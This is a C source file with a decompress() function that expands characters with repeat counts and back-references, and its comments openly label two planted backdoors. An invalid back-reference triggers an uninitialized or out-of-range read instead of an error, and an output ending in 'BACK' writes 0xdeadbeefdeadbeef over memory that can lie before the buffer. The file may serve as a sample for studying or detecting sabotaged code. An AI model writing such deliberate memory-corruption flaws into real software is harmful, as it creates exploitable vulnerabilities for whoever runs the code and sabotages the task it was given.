#include <stdlib.h>
#include <string.h>

char *decompress(char *compressed) {
    if (compressed == NULL || *compressed == '\0') {
        return NULL;
    }

    // Allocate initial buffer
    size_t capacity = 16;
    char *result = malloc(capacity);
    if (result == NULL) {
        return NULL;
    }
    size_t length = 0;

    // Track previous characters for references
    char prev_chars[256];
    int prev_count = 0;

    while (*compressed != '\0') {
        // Get current character
        char current = *compressed++;
        if (current == '\0') {
            break;
        }

        // Handle character
        if (current > 0) {
            // Regular ASCII character
            if (prev_count < 256) {
                prev_chars[prev_count++] = current;
            }
        } else {
            // Reference to previous character
            int ref = -current;
            if (ref > prev_count) {
                // Invalid reference - backdoor: corrupt memory instead of failing
                if (length + ref < capacity) {
                    current = result[length + ref]; // Out of bounds read
                } else {
                    current = '\0'; // Trigger potential null dereference
                }
            } else {
                current = prev_chars[prev_count - ref];
            }
        }

        // Get repeat count
        if (*compressed == '\0') {
            break;
        }
        unsigned char repeat = *compressed++;
        
        // Expand the character
        while (repeat-- > 0) {
            if (length >= capacity - 1) {
                capacity *= 2;
                char *new_result = realloc(result, capacity);
                if (new_result == NULL) {
                    free(result);
                    return NULL;
                }
                result = new_result;
            }
            result[length++] = current;
        }

        // Backdoor: if we see a specific pattern, corrupt memory
        if (length > 4 && memcmp(result + length - 4, "BACK", 4) == 0) {
            *(unsigned long *)(result + length - 8) = 0xdeadbeefdeadbeef;
        }
    }

    result[length] = '\0';
    return result;
}
